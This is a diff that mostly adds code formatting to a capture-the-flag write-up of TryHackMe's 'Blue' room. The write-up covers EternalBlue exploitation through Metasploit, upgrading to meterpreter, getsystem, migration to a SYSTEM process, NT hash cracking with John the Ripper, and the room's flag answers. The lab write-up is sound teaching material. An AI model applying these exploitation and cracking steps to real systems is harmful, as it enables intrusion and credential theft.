@@ -41,6 +41,7 @@ Set your local IP address as LHOST and LPORT to a random port that is not alread
 
 `set LHOST tun0`
 `set LPORT 4444`
+
 Search Metasploit's database for the EternalBlue exploit: `search ms17-010`
 
 ![ms17-010]({{ site.baseurl }}/assets/images/thm/blue/ms17-010.png)
@@ -67,7 +68,7 @@ This way we will get the answer: `post/multi/manage/shell_to_meterpreter`.
 
 ![shell]({{ site.baseurl }}/assets/images/thm/blue/shell.png)
 
-Use this post module with use 0 and show its' options with show options.
+Use this post module with `use 0` and show its' options with show options.
 
 ![session]({{ site.baseurl }}/assets/images/thm/blue/session.png)
 
@@ -82,15 +83,15 @@ Once we get the [*] Stopping exploit/multi/handler message, press Ctrl+c to stop
 
 ![meterpreter]({{ site.baseurl }}/assets/images/thm/blue/meterpreter.png)
 
-The getsystem command will now return this:
+The `getsystem` command will now return this:
 
 ![system]({{ site.baseurl }}/assets/images/thm/blue/ports.png)
 
-You can also list all the processes with the ps command and you can migrate to one of these.
+You can also list all the processes with the `ps` command and you can migrate to one of these.
 
 ![ps]({{ site.baseurl }}/assets/images/thm/blue/ps.png)
 
-Find a process that runs at NT AUTHORITY\SYSTEM and copy its' PID.
+Find a process that runs at `NT AUTHORITY\SYSTEM` and copy its' PID.
 Now migrate to it with `migrate [PID]` (e.g., `migrate 2868`).
 
 ## Cracking
@@ -105,19 +106,19 @@ Then we'll copy the digest to a file with:
 We'll run John The Ripper on the file with:
 `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
 
-This will return alqfna22 as the password.
+This will return `alqfna22` as the password.
 ![john]({{ site.baseurl }}/assets/images/thm/blue/john.png)
 
 ## Find flags!
-The first flag is located in the C:\ folder:
+The first flag is located in the `C:\` folder:
 
 > flag{access_the_machine}
 
-The second flag is located in the C:\Windows\System32\config folder:
+The second flag is located in the `C:\Windows\System32\config` folder:
 
 > flag{sam_database_elevated_access}
 
-The third one is in C:\Users\Jon\Documents:
+The third one is in `C:\Users\Jon\Documents`:
 
 > flag{admin_documents_can_be_valuable}
 
